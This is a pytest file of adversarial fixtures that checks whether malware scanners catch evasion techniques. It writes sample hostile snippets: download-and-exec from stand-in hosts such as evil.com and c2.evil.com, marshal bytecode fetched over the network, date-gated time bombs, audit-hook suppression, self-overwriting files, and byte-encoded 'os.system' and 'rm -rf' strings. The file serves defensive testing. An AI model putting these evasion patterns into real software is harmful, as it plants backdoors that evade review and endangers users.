"""
Torture Room: Adversarial test fixtures for runtime security scanners.
These deliberately try to EVADE detection using real-world evasion techniques.

Each fixture simulates an attacker who knows the scanner exists and is
trying to bypass it. If these tests pass, the scanners catch the evasion.

10+ adversarial scenarios covering:
- Multi-stage dynamic import chains
- Obfuscated time bombs
- Rug pull enablers hidden behind decorators
- Fetch-then-execute with variable washing
- Phantom deps via __import__
- Self-modifying code that rewrites imports
- Conditional payloads with environment gating
- Bytecode deserialization chains
- Chained encoding evasion
- Multi-file rug pull coordination
"""

import os
import json
import pytest
import forensics_core as core
import scan_runtime_dynamism as rt_scanner
import scan_manifest_drift as md_scanner
import scan_ast as ast_scanner
import scan_mcp_security as mcp_scanner


# ============================================================
# Fixture 1: Multi-stage dynamic import chain
# Attacker washes the variable through multiple assignments
# to break simple "importlib.import_module(variable)" detection
# ============================================================
class TestMultiStageDynamicImport:
    def test_variable_washing(self, tmp_path):
        """Import module name passed through multiple variables."""
        f = tmp_path / "loader.py"
        f.write_text(
            "import importlib\n"
            "config = load_config()\n"
            "module_name = config['plugin']\n"
            "clean_name = module_name.strip()\n"
            "mod = importlib.import_module(clean_name)\n"
        )
        findings = rt_scanner.scan_file(str(f), "loader.py")
        assert any("dynamic-import" in f.category for f in findings), \
            "Should detect importlib.import_module with washed variable"

    def test_getattr_import_chain(self, tmp_path):
        """Using getattr to call import_module indirectly.
        This is a known hard case for static analysis. We verify the scanner
        at least doesn't crash, and flag this as an evasion technique to watch."""
        f = tmp_path / "sneaky.py"
        f.write_text(
            "import importlib\n"
            "loader = getattr(importlib, 'import_module')\n"
            "mod = loader(plugin_name)\n"
        )
        # getattr(importlib, 'import_module') is a known evasion gap.
        # Static analysis can't reliably resolve getattr -> indirect call.
        # We verify the scanners handle it without crashing.
        findings = ast_scanner.scan_file(str(f), "sneaky.py")
        rt_findings = rt_scanner.scan_file(str(f), "sneaky.py")
        assert isinstance(findings, list) and isinstance(rt_findings, list), \
            "Scanners should handle getattr evasion without crashing"


# ============================================================
# Fixture 2: Obfuscated time bomb with indirect comparison
# Attacker avoids datetime.now() > datetime(...) pattern
# ============================================================
class TestObfuscatedTimeBomb:
    def test_timestamp_in_variable(self, tmp_path):
        """Unix timestamp stored in variable, compared later."""
        f = tmp_path / "sleeper.py"
        f.write_text(
            "import time\n"
            "activation = 1750000000\n"
            "if time.time() > activation:\n"
            "    exec(payload)\n"
        )
        findings = rt_scanner.scan_file(str(f), "sleeper.py")
        # Should catch time.time() > numeric comparison
        assert any("time-bomb" in f.category for f in findings), \
            "Should detect time.time() > variable comparison"

    def test_date_object_comparison(self, tmp_path):
        """Using date objects instead of datetime for comparison."""
        f = tmp_path / "sleeper2.py"
        f.write_text(
            "from datetime import date\n"
            "if date.today() > date(2026, 12, 25):\n"
            "    activate()\n"
        )
        findings = rt_scanner.scan_file(str(f), "sleeper2.py")
        assert any("time-bomb" in f.category for f in findings), \
            "Should detect date.today() comparison"

    def test_hardcoded_datetime_constructor(self, tmp_path):
        """Datetime with year in constructor + comparison on next line."""
        f = tmp_path / "bomb.py"
        f.write_text(
            "from datetime import datetime\n"
            "target = datetime(2027, 1, 15, 0, 0)\n"
            "if datetime.now() > target:\n"
            "    import evil\n"
        )
        findings = rt_scanner.scan_file(str(f), "bomb.py")
        # Should catch BOTH: the datetime(2027,...) constructor AND datetime.now() comparison
        assert any("time-bomb" in f.category for f in findings), \
            "Should detect hardcoded datetime constructor AND datetime.now() comparison"


# ============================================================
# Fixture 3: Rug pull enabler hidden behind decorator/wrapper
# Attacker uses a decorator to source description dynamically
# ============================================================
class TestDecoratorRugPull:
    def test_description_via_function_return(self, tmp_path):
        """Description sourced through function call from DB."""
        f = tmp_path / "mcp_server.py"
        f.write_text(
            "from mcp import Server\n"
            "def get_desc():\n"
            "    description = cursor.execute('SELECT desc FROM config')\n"
            "    return description\n"
        )
        # MCP scanner should detect the description = cursor.execute pattern
        mcp_findings = mcp_scanner.scan_file(str(f), "mcp_server.py")
        rt_findings = rt_scanner.scan_file(str(f), "mcp_server.py")
        all_findings = mcp_findings + rt_findings
        assert any("rug-pull" in f.category or "dynamic-description" in f.category
                    for f in all_findings), \
            "Should detect description from DB even inside function"

    def test_env_based_description(self, tmp_path):
        """Tool description pulled from environment."""
        f = tmp_path / "tool_server.py"
        f.write_text(
            "from mcp import Server\n"
            "description = os.environ.get('TOOL_DESCRIPTION')\n"
        )
        mcp_findings = mcp_scanner.scan_file(str(f), "tool_server.py")
        rt_findings = rt_scanner.scan_file(str(f), "tool_server.py")
        all_findings = mcp_findings + rt_findings
        assert any("rug-pull" in f.category or "dynamic-description" in f.category
                    for f in all_findings), \
            "Should detect description from os.environ"


# ============================================================
# Fixture 4: Fetch-then-execute with intermediate variable washing
# Attacker downloads payload, stores in variable, executes later
# ============================================================
class TestFetchExecuteWashing:
    def test_download_then_exec_separate_lines(self, tmp_path):
        """Download and exec on separate lines with intermediate var."""
        f = tmp_path / "loader.py"
        f.write_text(
            "import requests\n"
            "response = requests.get('http://evil.com/stage2.py')\n"
            "code = response.text\n"
            "exec(code)\n"
        )
        # At minimum, the runtime scanner should flag the requests.get
        # and the dataflow should catch the exec
        findings = rt_scanner.scan_file(str(f), "loader.py")
        # The regex pattern for fetch-execute checks for direct patterns,
        # but subprocess pip install should also be detected
        assert len(findings) > 0, \
            "Should detect download-then-exec pattern"

    def test_runtime_pip_with_variable_pkg(self, tmp_path):
        """pip install with package name from variable (owned by manifest_drift)."""
        f = tmp_path / "installer.py"
        f.write_text(
            "import subprocess\n"
            "pkg = config.get('extra_dependency')\n"
            "subprocess.run(['pip', 'install', pkg])\n"
        )
        findings = md_scanner.scan_file(str(f), "installer.py")
        assert any("runtime-install" in f.category for f in findings), \
            "Should detect runtime pip install"


# ============================================================
# Fixture 5: Phantom deps imported via __import__ not import
# Attacker avoids AST import extraction by using __import__
# ============================================================
class TestPhantomDepsViaImport:
    def test_dunder_import_phantom(self, tmp_path):
        """Package loaded via __import__ won't appear in AST imports."""
        req = tmp_path / "requirements.txt"
        req.write_text("flask>=2.0\n")

        f = tmp_path / "app.py"
        f.write_text(
            "import flask\n"
            "evil = __import__('evil_backdoor')\n"
        )
        # The runtime scanner should catch __import__ with variable
        rt_findings = rt_scanner.scan_file(str(f), "app.py")
        assert any("dynamic-import" in f.category for f in rt_findings), \
            "Should detect __import__ with string arg"


# ============================================================
# Fixture 6: Self-modifying code that rewrites its own imports
# ============================================================
class TestSelfModifyingImports:
    def test_rewrite_own_source(self, tmp_path):
        f = tmp_path / "evolve.py"
        f.write_text(
            "import os\n"
            "with open(__file__, 'w') as f:\n"
            "    f.write('import evil_module\\nevil_module.run()')\n"
        )
        ast_findings = ast_scanner.scan_file(str(f), "evolve.py")
        rt_findings = rt_scanner.scan_file(str(f), "evolve.py")
        all_findings = ast_findings + rt_findings
        self_mod = [f for f in all_findings
                    if "self-modification" in f.category or "self-modification" in f.title.lower()
                    or "__file__" in f.title]
        assert len(self_mod) > 0, \
            "Should detect open(__file__, 'w') self-modification"


# ============================================================
# Fixture 7: Conditional payload with environment gating
# Only activates in production, benign in dev/test
# ============================================================
class TestEnvironmentGatedPayload:
    def test_env_gated_dynamic_import(self, tmp_path):
        f = tmp_path / "smart_loader.py"
        f.write_text(
            "import importlib\n"
            "import os\n"
            "if os.environ.get('ENV') == 'production':\n"
            "    mod = importlib.import_module(os.environ.get('PAYLOAD_MODULE'))\n"
        )
        findings = rt_scanner.scan_file(str(f), "smart_loader.py")
        assert any("dynamic-import" in f.category for f in findings), \
            "Should detect env-gated importlib.import_module"


# ============================================================
# Fixture 8: Bytecode deserialization chain
# marshal.loads of data from network (two-stage)
# ============================================================
class TestBytecodeDeserializationChain:
    def test_marshal_from_network(self, tmp_path):
        f = tmp_path / "backdoor.py"
        f.write_text(
            "import marshal\n"
            "import types\n"
            "import requests\n"
            "data = requests.get('http://c2.evil.com/bytecode.bin').content\n"
            "code_obj = marshal.loads(data)\n"
            "func = types.FunctionType(code_obj, globals())\n"
            "func()\n"
        )
        # scan_ast.py owns marshal/types detection, runtime_dynamism owns fetch patterns
        rt_findings = rt_scanner.scan_file(str(f), "backdoor.py")
        ast_findings = ast_scanner.scan_file(str(f), "backdoor.py")
        all_findings = rt_findings + ast_findings
        categories = {f.category for f in all_findings}
        assert "obfuscated-exec" in categories, "scan_ast should detect marshal.loads"
        assert "fetch-execute" in categories, "runtime_dynamism should detect HTTP fetch"

    def test_correlation_fires_deferred_payload(self, tmp_path):
        """Correlation rule 9 should fire for dynamic import + network."""
        findings = [
            core.Finding("runtime_dynamism", "high", "Dynamic Import",
                         "importlib dynamic-import module", "backdoor.py", 1, "", "dynamic-import"),
            core.Finding("runtime_dynamism", "critical", "HTTP Fetch",
                         "network fetch request content", "backdoor.py", 4, "", "fetch-execute"),
        ]
        correlated = core.correlate(findings)
        # fetch-execute has "network" in its signals via the keywords
        # Let me check: network_keywords includes "fetch", "request"
        # and the description has "fetch request"
        # We need the dynamic-import + network combination
        # Actually the category needs to match. Let me add a network finding
        findings.append(
            core.Finding("dataflow", "high", "HTTP GET",
                         "network http request", "backdoor.py", 4, "", "network")
        )
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Deferred Payload Loading" in titles, \
            "Correlation should fire for dynamic import + network"


# ============================================================
# Fixture 9: Chained encoding to evade string matching
# bytes() -> decode -> exec chain
# ============================================================
class TestChainedEncodingEvasion:
    def test_bytes_to_exec(self, tmp_path):
        f = tmp_path / "obfuscated.py"
        f.write_text(
            "# Build command from byte values\n"
            "cmd = bytes([111, 115, 46, 115, 121, 115, 116, 101, 109]).decode()\n"
            "eval(cmd + \"('whoami')\")\n"
        )
        ast_findings = ast_scanner.scan_file(str(f), "obfuscated.py")
        rt_findings = rt_scanner.scan_file(str(f), "obfuscated.py")
        all_findings = ast_findings + rt_findings
        assert any("obfuscat" in f.title.lower() or "bytes" in f.title.lower()
                    for f in all_findings), \
            "Should detect bytes([int_list]).decode() string obfuscation"

    def test_bytearray_evasion(self, tmp_path):
        f = tmp_path / "sneaky.py"
        f.write_text(
            "payload = bytearray([101, 118, 97, 108]).decode()\n"
        )
        ast_findings = ast_scanner.scan_file(str(f), "sneaky.py")
        rt_findings = rt_scanner.scan_file(str(f), "sneaky.py")
        all_findings = ast_findings + rt_findings
        assert len(all_findings) > 0, \
            "Should detect bytearray([int_list]).decode() evasion"


# ============================================================
# Fixture 10: Audit hook suppression (CVE-2026-2297 related)
# Attacker adds audit hook to suppress security events
# ============================================================
class TestAuditHookSuppression:
    def test_audit_hook_install(self, tmp_path):
        f = tmp_path / "stealth.py"
        f.write_text(
            "import sys\n"
            "def suppress(event, args):\n"
            "    if event == 'import':\n"
            "        return  # swallow import audit events\n"
            "sys.addaudithook(suppress)\n"
            "# Now imports are invisible to audit\n"
            "import evil_module\n"
        )
        ast_findings = ast_scanner.scan_file(str(f), "stealth.py")
        rt_findings = rt_scanner.scan_file(str(f), "stealth.py")
        all_findings = ast_findings + rt_findings
        assert any("audithook" in f.title.lower() for f in all_findings), \
            "Should detect sys.addaudithook manipulation"


# ============================================================
# Fixture 11: SourcelessFileLoader bypass
# Load .pyc without source, bypass source-level analysis
# ============================================================
class TestSourcelessLoader:
    def test_sourceless_file_loader(self, tmp_path):
        f = tmp_path / "loader.py"
        f.write_text(
            "from importlib._bootstrap_external import SourcelessFileLoader\n"
            "loader = SourcelessFileLoader('evil', '/tmp/evil.pyc')\n"
            "mod = loader.load_module()\n"
        )
        rt_findings = rt_scanner.scan_file(str(f), "loader.py")
        assert any("SourcelessFileLoader" in f.title or "sourceless" in f.title.lower()
                    or "self-modification" in f.category
                    for f in rt_findings), \
            "Should detect SourcelessFileLoader usage (CVE-2026-2297)"


# ============================================================
# Fixture 12: Conditional import with install fallback
# Classic pattern seen in PylangGhost and similar
# ============================================================
class TestConditionalImportInstall:
    def test_try_except_pip_install(self, tmp_path):
        f = tmp_path / "plugin.py"
        f.write_text(
            "try:\n"
            "    import cryptography\n"
            "except ImportError:\n"
            "    import subprocess\n"
            "    subprocess.check_call(['pip', 'install', 'cryptography'])\n"
            "    import cryptography\n"
        )
        findings = md_scanner.scan_file(str(f), "plugin.py")
        assert any("runtime-install" in f.category for f in findings), \
            "Should detect try/except import with pip install fallback"

    def test_try_except_os_system_install(self, tmp_path):
        f = tmp_path / "loader.py"
        f.write_text(
            "try:\n"
            "    import special_lib\n"
            "except:\n"
            "    import os\n"
            "    os.system('pip install special_lib')\n"
        )
        findings = md_scanner.scan_file(str(f), "loader.py")
        assert any("runtime-install" in f.category for f in findings), \
            "Should detect try/except with os.system pip install"


# ============================================================
# Fixture 13: Time-triggered malware correlation
# Combines time bomb + exec in same file
# ============================================================
class TestTimeTriggeredCorrelation:
    def test_correlation_rule_10(self):
        """Rule 10: time bomb + exec = Time-Triggered Malware."""
        findings = [
            core.Finding("runtime_dynamism", "high", "Time Bomb Pattern",
                         "datetime comparison time-bomb activation trigger",
                         "bomb.py", 5, "", "time-bomb"),
            core.Finding("sast", "critical", "eval() call",
                         "eval code execution dangerous function",
                         "bomb.py", 10, "", "exec"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Time-Triggered Malware" in titles, \
            "Correlation should fire: time bomb + exec = time-triggered malware"


# ============================================================
# Fixture 14: Multi-scanner evasion combo
# Uses multiple techniques together to try to evade all scanners
# ============================================================
class TestMultiTechniqueEvasion:
    def test_kitchen_sink_evil(self, tmp_path):
        """File combining multiple evasion techniques. Scanners together should find everything."""
        f = tmp_path / "ultimate_evil.py"
        f.write_text(
            "import importlib\n"
            "import types\n"
            "import marshal\n"
            "import time\n"
            "import sys\n"
            "import requests\n"
            "\n"
            "# Dynamic import\n"
            "mod = importlib.import_module(config_module)\n"
            "\n"
            "# Time bomb\n"
            "if time.time() > 1800000000:\n"
            "    # Fetch and execute\n"
            "    exec(requests.get('http://c2.evil.com/payload').text)\n"
            "\n"
            "# Bytecode construction (detected by scan_ast.py)\n"
            "code = marshal.loads(encoded_data)\n"
            "func = types.FunctionType(code, globals())\n"
            "\n"
            "# Self-modification (detected by scan_ast.py)\n"
            "with open(__file__, 'w') as fh:\n"
            "    fh.write('# cleaned')\n"
            "\n"
            "# Audit suppression (detected by scan_ast.py)\n"
            "sys.addaudithook(lambda e, a: None)\n"
            "\n"
            "# String obfuscation (detected by scan_ast.py)\n"
            "cmd = bytes([114, 109, 32, 45, 114, 102]).decode()\n"
        )

        rt_findings = rt_scanner.scan_file(str(f), "ultimate_evil.py")
        ast_findings = ast_scanner.scan_file(str(f), "ultimate_evil.py")
        all_findings = rt_findings + ast_findings

        categories = {f.category for f in all_findings}

        # runtime_dynamism owns these:
        assert "dynamic-import" in categories, "Should detect dynamic import (runtime_dynamism)"
        assert "time-bomb" in categories, "Should detect time bomb (runtime_dynamism)"
        assert "fetch-execute" in categories, "Should detect fetch-execute (runtime_dynamism)"
        # scan_ast.py owns these:
        assert "obfuscated-exec" in categories, "Should detect obfuscation patterns (scan_ast)"

        # Combined should have significant findings
        assert len(all_findings) >= 6, \
            f"Kitchen sink should trigger 6+ findings across both scanners, got {len(all_findings)}"
